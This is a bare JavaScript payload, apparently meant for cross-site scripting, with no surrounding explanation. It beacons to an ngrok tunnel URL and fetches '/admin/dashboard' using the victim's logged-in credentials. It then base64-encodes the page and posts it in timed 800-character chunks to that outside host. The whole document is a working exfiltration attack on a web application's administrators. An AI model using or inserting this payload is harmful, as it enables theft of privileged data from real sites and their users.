const url="https://30a8-2402-800-61c7-539d-60ad-28f0-6942-5ea2.ngrok-free.app";

fetch(url+"?note=start")

fetch('/admin/dashboard',{credentials:'include'})
.then(r=>r.text())
.then(d=>{

let i=0
let chunk=800

function send(){

 if(i>=d.length){
   fetch(url+"?note=end")
   return
 }

 fetch(url,{
   method:"POST",
   mode:"no-cors",
   body:btoa(d.slice(i,i+chunk))
 })

 i+=chunk
 setTimeout(send,1000)

}

send()

})
